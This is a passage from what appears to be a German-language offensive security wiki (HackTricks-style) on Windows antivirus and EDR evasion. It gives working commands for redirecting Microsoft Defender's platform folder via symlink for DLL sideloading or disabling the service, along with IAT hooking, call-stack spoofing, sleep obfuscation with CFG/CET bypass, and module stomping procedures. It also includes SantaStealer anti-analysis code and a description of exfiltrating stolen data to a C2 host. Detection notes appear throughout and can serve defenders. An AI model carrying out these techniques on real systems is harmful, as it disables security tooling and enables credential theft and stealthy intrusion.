- Process creation von `ClipUp.exe` mit ungewöhnlichen Argumenten, besonders wenn der Parent ein nicht standardmäßiger Launcher ist, rund um den Bootvorgang.
- Neue Services, die auf Auto-Start konfiguriert sind und verdächtige Binärdateien zuverlässig vor Defender/AV starten. Untersuche Service-Erstellung/-Änderung vor Defender-Startfehlern.
- File integrity monitoring auf Defender-Binärdateien/Platform-Verzeichnissen; unerwartete Datei-Erstellungen/-Änderungen durch Prozesse mit protected-process flags.
- ETW/EDR-Telemetrie: Suche nach Prozessen, die mit `CREATE_PROTECTED_PROCESS` erstellt wurden, und nach anomalem PPL-Level-Use durch Nicht-AV-Binärdateien.

Mitigations
- WDAC/Code Integrity: Beschränke, welche signierten Binärdateien als PPL laufen dürfen und unter welchen Parents; blockiere ClipUp-Aufrufe außerhalb legitimer Kontexte.
- Service hygiene: Beschränke das Erstellen/Ändern von Auto-Start-Services und überwache Manipulationen der Startreihenfolge.
- Stelle sicher, dass Defender tamper protection und early-launch protections aktiviert sind; untersuche Startfehler, die auf Binärkorruption hinweisen.
- Erwäge, die 8.3 short-name generation auf Volumes, die Security-Tools hosten, zu deaktivieren, falls das mit deiner Umgebung kompatibel ist (gründlich testen).

Referenzen für PPL und tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender wählt die Platform, aus der es läuft, indem es Unterordner unter:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Es wählt den Unterordner mit dem höchsten lexikografischen Versionsstring (z. B. `4.18.25070.5-0`) und startet dann die Defender-Service-Prozesse von dort aus (wobei Service-/Registry-Pfade entsprechend aktualisiert werden). Diese Auswahl vertraut Directory-Entries einschließlich Directory Reparse Points (symlinks). Ein Administrator kann das nutzen, um Defender auf einen attacker-writable Pfad umzuleiten und DLL sideloading oder Service disruption zu erreichen.

Preconditions
- Lokaler Administrator (benötigt, um Verzeichnisse/symlinks unter dem Platform-Ordner zu erstellen)
- Möglichkeit zum Reboot oder zum Auslösen einer erneuten Defender-Platform-Auswahl (Service-Neustart beim Boot)
- Es werden nur Built-in-Tools benötigt (mklink)

Why it works
- Defender blockiert Writes in seinen eigenen Ordnern, aber die Platform-Auswahl vertraut Directory-Entries und wählt die lexikografisch höchste Version, ohne zu validieren, dass das Ziel auf einen geschützten/vertrauenswürdigen Pfad aufgelöst wird.

Step-by-step (example)
1) Bereite eine beschreibbare Kopie des aktuellen Platform-Ordners vor, z. B. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Erstelle innerhalb von Platform einen Symlink für ein Verzeichnis mit höherer Version, der auf deinen Ordner zeigt:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Trigger-Auswahl (Neustart empfohlen):
```cmd
shutdown /r /t 0
```
4) Verifiziere, dass MsMpEng.exe (WinDefend) vom umgeleiteten Pfad ausgeführt wird:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Du solltest den neuen Prozesspfad unter `C:\TMP\AV\` und die Dienstkonfiguration/Registry beobachten, die diesen Ort widerspiegelt.

Post-Exploitation-Optionen
- DLL sideloading/code execution: Drop/replace DLLs, die Defender aus seinem Anwendungsverzeichnis lädt, um Code in Defenders Prozessen auszuführen. Siehe den Abschnitt oben: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Entferne den version-symlink, sodass beim nächsten Start der konfigurierte Pfad nicht aufgelöst wird und Defender nicht startet:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Beachte, dass diese Technik für sich allein keine privilege escalation bietet; sie erfordert admin rights.

## API/IAT Hooking + Call-Stack Spoofing mit PIC (Crystal Kit-style)

Red teams können runtime evasion aus dem C2 implant heraus in das Zielmodul selbst verlagern, indem sie dessen Import Address Table (IAT) hooken und ausgewählte APIs über angreifer-kontrollierten, position‑unabhängigen code (PIC) routen. Das verallgemeinert evasion über die kleine API-Oberfläche, die viele Kits bereitstellen (z. B. CreateProcessA), und erweitert denselben Schutz auf BOFs und post‑exploitation DLLs.

High-level approach
- Stage eine PIC blob neben dem Zielmodul mit einem reflective loader (prepended oder companion). Das PIC muss selbstständig und position‑unabhängig sein.
- Wenn die Host-DLL geladen wird, durchlaufe ihre IMAGE_IMPORT_DESCRIPTOR und patch die IAT-Einträge für Ziel-Imports (z. B. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), damit sie auf schlanke PIC wrappers zeigen.
- Jeder PIC wrapper führt evasions aus, bevor er per tail-call die echte API-Adresse aufruft. Typische evasions umfassen:
- Memory mask/unmask um den Aufruf herum (z. B. beacon regions verschlüsseln, RWX→RX, page names/permissions ändern) und danach wiederherstellen.
- Call-stack spoofing: einen benign stack konstruieren und in die Ziel-API übergehen, sodass call-stack analysis erwartete Frames auflöst.
- Für Kompatibilität eine Schnittstelle exportieren, damit ein Aggressor script (oder Äquivalent) registrieren kann, welche APIs für Beacon, BOFs und post-ex DLLs gehookt werden sollen.

Why IAT hooking here
- Funktioniert für jeden code, der den gehookten Import verwendet, ohne den tool code zu ändern oder darauf zu setzen, dass Beacon bestimmte APIs proxyt.
- Deckt post-ex DLLs ab: Das Hooken von LoadLibrary* ermöglicht es dir, Modul-Ladevorgänge abzufangen (z. B. System.Management.Automation.dll, clr.dll) und dieselbe masking/stack evasion auf ihre API-Aufrufe anzuwenden.
- Stellt die zuverlässige Nutzung von process-spawning post-ex commands gegen call-stack–basierte detections wieder her, indem CreateProcessA/W umschlossen wird.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- Wende den Patch nach den Relocations/ASLR und vor der ersten Nutzung des Imports an. Reflective loaders wie TitanLdr/AceLdr demonstrieren Hooking während DllMain des geladenen Moduls.
- Halte Wrapper klein und PIC-safe; löse die echte API über den ursprünglichen IAT-Wert auf, den du vor dem Patchen erfasst hast, oder über LdrGetProcedureAddress.
- Nutze RW → RX-Übergänge für PIC und vermeide es, schreibbare+ausführbare Seiten zu belassen.

Call‑stack spoofing stub
- Draugr‑style PIC stubs bauen eine gefälschte Call-Chain auf (Return-Adressen in harmlose Module) und pivoten dann in die echte API.
- Das umgeht Erkennungen, die kanonische Stacks von Beacon/BOFs zu sensiblen APIs erwarten.
- Kombiniere es mit stack cutting/stack stitching-Techniken, um vor dem API-Prolog in erwarteten Frames zu landen.

Operational integration
- Stelle den reflective loader vor post-ex DLLs, damit der PIC und die Hooks automatisch initialisiert werden, wenn die DLL geladen wird.
- Nutze ein Aggressor script, um Ziel-APIs zu registrieren, sodass Beacon und BOFs transparent vom selben Evasion-Pfad profitieren, ohne Codeänderungen.

Detection/DFIR considerations
- IAT integrity: Einträge, die auf non-image (heap/anon) Adressen aufgelöst werden; periodische Verifikation von Import-Pointern.
- Stack anomalies: Return-Adressen, die nicht zu geladenen Images gehören; abrupte Übergänge zu non-image PIC; inkonsistente RtlUserThreadStart-Abstammung.
- Loader telemetry: In-process-Schreibzugriffe auf die IAT, frühe DllMain-Aktivität, die Import-Thunks verändert, unerwartete RX-Regionen, die beim Laden erzeugt werden.
- Image-load evasion: Wenn LoadLibrary* gehookt wird, überwache verdächtige Loads von automation/clr assemblies, die mit memory masking events korrelieren.

Related building blocks and examples
- Reflective loaders, die während des Ladens IAT patching durchführen (z. B. TitanLdr, AceLdr)
- Memory masking hooks (z. B. simplehook) und stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stubs (z. B. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

Wenn du einen reflective loader kontrollierst, kannst du Imports **während** `ProcessImports()` hooken, indem du den `GetProcAddress`-Pointer des Loaders durch einen Custom Resolver ersetzt, der Hooks zuerst prüft:

- Baue ein **residentes PICO** (persistent PIC object), das nach dem Freigeben des transienten Loader-PIC weiterlebt.
- Exportiere eine `setup_hooks()`-Funktion, die den Import-Resolver des Loaders überschreibt (z. B. `funcs.GetProcAddress = _GetProcAddress`).
- In `_GetProcAddress` überspringe Ordinal-Imports und nutze eine hashbasierte Hook-Lookup wie `__resolve_hook(ror13hash(name))`. Wenn ein Hook existiert, gib ihn zurück; andernfalls delegiere an das echte `GetProcAddress`.
- Registriere Hook-Ziele zur Link-Zeit mit Crystal Palace `addhook "MODULE$Func" "hook"`-Einträgen. Der Hook bleibt gültig, weil er im residenten PICO lebt.

Dies ergibt **import-time IAT redirection**, ohne die Code-Sektion der geladenen DLL nach dem Laden zu patchen.

### Erzwingen hookbarer Imports, wenn das Target PEB-walking nutzt

Import-time Hooks greifen nur, wenn die Funktion tatsächlich in der IAT des Targets steht. Wenn ein Modul APIs via PEB-walk + Hash auflöst (kein Import-Eintrag), erzwinge einen echten Import, damit der `ProcessImports()`-Pfad des Loaders ihn sieht:

- Ersetze gehashte Export-Auflösung (z. B. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) durch eine direkte Referenz wie `&WaitForSingleObject`.
- Der Compiler erzeugt einen IAT-Eintrag, wodurch Interception möglich wird, wenn der reflective loader Imports auflöst.

### Ekko-style sleep/idle obfuscation ohne `Sleep()`-Patch

Statt `Sleep` zu patchen, hooke die **echten Wait-/IPC-Primitiven**, die der Implant nutzt (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Bei langen Wartezeiten wickle den Call in eine Ekko-style Obfuscation-Chain ein, die das In-Memory-Image während der Idle-Phase verschlüsselt:

- Nutze `CreateTimerQueueTimer`, um eine Sequenz von Callbacks zu planen, die `NtContinue` mit konstruierten `CONTEXT`-Frames aufrufen.
- Typische Chain (x64): Image auf `PAGE_READWRITE` setzen → per RC4 mit `advapi32!SystemFunction032` über das vollständige gemappte Image verschlüsseln → den blockierenden Wait ausführen → RC4 entschlüsseln → **Permissions pro Sektion wiederherstellen**, indem PE-Sektionen durchlaufen werden → Abschluss signalisieren.
- `RtlCaptureContext` liefert eine Vorlage für `CONTEXT`; kopiere sie in mehrere Frames und setze Register (`Rip/Rcx/Rdx/R8/R9`), um jeden Schritt auszuführen.

Operatives Detail: Gib für lange Waits „success“ zurück (z. B. `WAIT_OBJECT_0`), damit der Caller fortfährt, während das Image maskiert ist. Dieses Muster verbirgt das Modul während Idle-Fenstern vor Scannern und vermeidet die klassische Signatur eines „gepatchten `Sleep()`“.

Detection ideas (telemetry-based)
- Bursts von `CreateTimerQueueTimer`-Callbacks, die auf `NtContinue` zeigen.
- `advapi32!SystemFunction032`, verwendet auf großen zusammenhängenden, imagegroßen Buffern.
- Großbereichs-`VirtualProtect` gefolgt von benutzerdefinierter Wiederherstellung von Berechtigungen pro Sektion.

### Runtime CFG registration für Sleep-Obfuscation-Gadgets

Auf CFG-aktivierten Targets führt der erste indirekte Sprung in ein Mid-Function-Gadget wie `jmp [rbx]` oder `jmp rdi` normalerweise zum Absturz des Prozesses mit `STATUS_STACK_BUFFER_OVERRUN`, weil das Gadget nicht in den CFG-Metadaten des Moduls vorhanden ist. Um Ekko/Kraken-Style-Chains in gehärteten Prozessen am Leben zu halten:

- Registriere jedes indirekte Ziel, das von der Chain verwendet wird, mit `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` und `CFG_CALL_TARGET_VALID`-Einträgen.
- Für Adressen innerhalb geladener Images (`ntdll`, `kernel32`, `advapi32`) muss der `MEMORY_RANGE_ENTRY` bei der **Image-Base** beginnen und die **gesamte Image-Größe** abdecken.
- Für manuell gemappte/PIC/gestompte Bereiche verwende stattdessen die **Allocation Base** und die Allocationsgröße.
- Markiere nicht nur das Dispatch-Gadget, sondern auch indirekt erreichte Exports (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, Wait/Event-Syscalls) und alle attacker-controlled executable sections, die zu indirekten Zielen werden.

Damit werden ROP/JOP-Style Sleep-Chains von „funktioniert nur in non-CFG-Prozessen“ zu einem wiederverwendbaren Primitive für `explorer.exe`, Browser, `svchost.exe` und andere Endpunkte, die mit `/guard:cf` kompiliert wurden.

### CET-safe stack spoofing für schlafende Threads

Ein vollständiger `CONTEXT`-Austausch ist laut und kann auf CET Shadow Stack-Systemen brechen, weil ein gespoofter `Rip` immer noch mit dem Hardware-Shadow-Stack übereinstimmen muss. Ein sichereres Sleep-Masking-Muster ist:

- Wähle einen anderen Thread im selben Prozess und lies dessen `NT_TIB` / TEB-Stack-Grenzen (`StackBase`, `StackLimit`) via `NtQueryInformationThread` aus.
- Sichere das echte TEB/TIB des aktuellen Threads.
- Erfasse den echten schlafenden Kontext mit `GetThreadContext`.
- Kopiere **nur** den echten `Rip` in den Spoof-Kontext und lasse den gespooften `Rsp`/Stack-Zustand intakt.
- Während des Sleep-Fensters kopiere das `NT_TIB` des Spoof-Threads in das aktuelle TEB, damit Stack-Walker innerhalb eines legitimen Stack-Bereichs unwinden.
- Nach Ende des Waits stelle das ursprüngliche TIB und den Thread-Kontext wieder her.

Das erhält einen CET-konsistenten Instruction Pointer, täuscht aber EDR-Stack-Walker, die TEB-Stack-Metadaten zur Validierung von Unwinds verwenden.

### APC-based alternative: Kraken Mask

Wenn Timer-Queue-Dispatch zu signaturstark ist, kann dieselbe sleep-encrypt-spoof-restore-Sequenz von einem suspendierten Helper-Thread mittels gequeueter APCs ausgeführt werden:

- Erstelle einen Helper-Thread mit `NtTestAlert` als Entry-Point.
- Queue vorbereitete `CONTEXT`-Frames/APCs mit `NtQueueApcThread` und entleere sie mit `NtAlertResumeThread`.
- Speichere den Chain-State im Heap statt im Helper-Stack, um den standardmäßigen 64-KB-Thread-Stack nicht zu erschöpfen.
- Nutze `NtSignalAndWaitForSingleObject`, um das Start-Event atomar zu signalisieren und zu blockieren.
- Suspendiere den Main-Thread vor der Wiederherstellung von TIB/Context (`NtSuspendThread` → restore → `NtResumeThread`), um das Race-Fenster zu verkleinern, in dem ein Scanner einen halb wiederhergestellten Stack erfassen könnte.

Damit wird die Signatur `CreateTimerQueueTimer` + `NtContinue` durch eine Helper-Thread/APC-Signatur ersetzt, während dieselben RC4-Masking- und Stack-Spoofing-Ziele beibehalten werden.

Additional detection ideas
- `NtSetInformationVirtualMemory` mit `VmCfgCallTargetInformation` kurz vor Sleeps, Waits oder APC-Dispatch.
- `GetThreadContext`/`SetThreadContext`, um `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` oder `ConnectNamedPipe` gelegt.
- `NtQueryInformationThread` gefolgt von direkten Writes in die Stack-Grenzen des aktuellen Threads im TEB/TIB.
- `NtQueueApcThread`/`NtAlertResumeThread`-Chains, die indirekt `SystemFunction032`, `VirtualProtect` oder Helfer zur Wiederherstellung von Section-Permissions erreichen.
- Wiederholte Nutzung kurzer Gadget-Signaturen wie `FF 23` (`jmp [rbx]`) oder `FF E7` (`jmp rdi`) als Dispatch-Pivots innerhalb signierter Module.


## Precision Module Stomping

Module stomping führt Payloads aus der **`.text`-Sektion einer DLL aus, die bereits im Zielprozess gemappt ist**, statt offensichtlichen privaten Executable Memory zu allokieren oder eine frische Sacrificial-DLL zu laden. Das Ziel zum Überschreiben sollte ein **geladenes, disk-gestütztes Image** sein, dessen Code-Bereich den Payload aufnehmen kann, ohne Codepfade zu beschädigen, die der Prozess noch braucht.

### Reliable target selection

Naives Stomping gegen gängige Module wie `uxtheme.dll` oder `comctl32.dll` ist fragil: Die DLL ist möglicherweise nicht im Remote-Prozess geladen, und ein zu kleiner Code-Bereich lässt den Prozess abstürzen. Ein zuverlässigerer Ablauf ist:

1. Enumeriere die Module des Zielprozesses und behalte eine **nur-nach-Namen-Include-Liste** der bereits geladenen DLLs.
2. Baue zuerst den Payload und notiere seine **exakte Byte-Größe**.
3. Scanne Kandidaten-DLLs auf der Festplatte und vergleiche die PE-Sektion **`.text` `Misc_VirtualSize`** mit der Payload-Größe. Das ist wichtiger als die Dateigröße, weil es die Größe der Executable Section **im gemappten Speicher** widerspiegelt.
4. Parse die **Export Address Table (EAT)** und wähle eine Export-Funktion-RVA als Stomp-Startoffset.
5. Berechne den **Blast Radius**: Wenn der Payload die gewählte Funktionsgrenze überschreitet, überschreibt er angrenzende Exports, die danach im Speicher angeordnet sind.

Typische Recon-/Selection-Helper, die in freier Wildbahn zu sehen sind:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Betriebsnotizen
- Bevorzuge DLLs, die im Remote-Prozess **bereits geladen** sind, um die Telemetrie von `LoadLibrary`/unerwarteten Image-Loads zu vermeiden.
- Bevorzuge Exports, die von der Zielanwendung selten ausgeführt werden; andernfalls können normale Codepfade die gestompten Bytes vor oder nach der Thread-Erstellung erreichen.
- Große Implants erfordern oft, dass das Einbetten von Shellcode von einem String-Literal auf einen **Byte-Array-/Braced-Initializer** umgestellt wird, damit der vollständige Buffer im Injector-Quellcode korrekt dargestellt wird.

Erkennungsansätze
- Remote Writes in **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) statt der üblichen privaten RWX/RX-Allocations.
- Export-Entry-Points, deren Bytes im Speicher nicht mehr mit der zugrunde liegenden Datei auf der Festplatte übereinstimmen.
- Remote Threads oder Context Pivots, die die Ausführung innerhalb eines legitimen DLL-Exports beginnen, dessen erste Bytes kürzlich verändert wurden.
- Verdächtige `VirtualProtect(Ex)` / `WriteProcessMemory`-Sequenzen gegen DLL-`.text`-Pages, gefolgt von Thread-Erstellung.

## SantaStealer Tradecraft für Fileless Evasion und Credential Theft

SantaStealer (aka BluelineStealer) zeigt, wie moderne Info-Stealer AV bypass, Anti-Analysis und Credential Access in einem einzigen Workflow kombinieren.

### Keyboard-Layout-Gating & Sandbox-Delay

- Ein Config-Flag (`anti_cis`) enumeriert installierte Keyboard-Layouts über `GetKeyboardLayoutList`. Wenn ein kyrillisches Layout gefunden wird, legt das Sample einen leeren `CIS`-Marker ab und beendet sich vor dem Start der Stealer, sodass es niemals auf ausgeschlossenen Lokalen detoniert, während es ein Hunting-Artefakt hinterlässt.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Geschichtete `check_antivm`-Logik

- Variante A durchläuft die Prozessliste, hasht jeden Namen mit einer benutzerdefinierten Rolling-Checksum und vergleicht sie mit eingebetteten Blocklisten für Debugger/Sandboxes; sie wiederholt die Checksum über den Rechnernamen und prüft Arbeitsverzeichnisse wie `C:\analysis`.
- Variante B untersucht Systemeigenschaften (Mindestanzahl von Prozessen, kürzliche Laufzeit), ruft `OpenServiceA("VBoxGuest")` auf, um VirtualBox-Erweiterungen zu erkennen, und führt Timing-Prüfungen um Sleeps herum durch, um Single-Stepping zu erkennen. Jeder Treffer bricht ab, bevor Module gestartet werden.

### Fileless Helper + doppelte ChaCha20-reflektive Ladeausführung

- Die primäre DLL/EXE bettet einen Chromium credential helper ein, der entweder auf die Festplatte geschrieben oder manuell im Speicher gemappt wird; der fileless-Modus löst Imports/Relocations selbst auf, sodass keine Helper-Artefakte geschrieben werden.
- Dieser Helper speichert eine zweite DLL-Phase, die zweimal mit ChaCha20 verschlüsselt ist (zwei 32-Byte-Keys + 12-Byte-Nonces). Nach beiden Durchläufen lädt er den Blob reflektiv (kein `LoadLibrary`) und ruft die Exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` auf, abgeleitet von [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Die ChromElevator-Routinen nutzen direct-syscall reflective process hollowing, um in einen laufenden Chromium-Browser zu injizieren, AppBound Encryption-Keys zu übernehmen und Passwörter/Cookies/Kreditkarten direkt aus SQLite-Datenbanken zu entschlüsseln, trotz ABE-Härtung.


### Modulare In-Memory-Sammlung & chunked HTTP Exfiltration

- `create_memory_based_log` iteriert über eine globale `memory_generators`-Funktionstabelle und startet einen Thread pro aktiviertem Modul (Telegram, Discord, Steam, Screenshots, Dokumente, Browser-Erweiterungen usw.). Jeder Thread schreibt Ergebnisse in gemeinsame Puffer und meldet seine Dateianzahl nach einem Join-Fenster von ~45s.
- Sobald alles fertig ist, wird alles mit der statisch gelinkten `miniz`-Bibliothek als `%TEMP%\\Log.zip` gezippt. `ThreadPayload1` schläft dann 15s und streamt das Archiv in 10 MB-Chunks per HTTP POST an `http://<C2>:6767/upload`, wobei ein Browser-`multipart/form-data`-Boundary (`----WebKitFormBoundary***`) vorgetäuscht wird. Jeder Chunk fügt `User-Agent: upload`, `auth: <build_id>`, optional `w: <campaign_tag>` hinzu, und der letzte Chunk hängt `complete: true` an, damit das C2 weiß, dass die Reassemblierung abgeschlossen ist.

## References


- [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
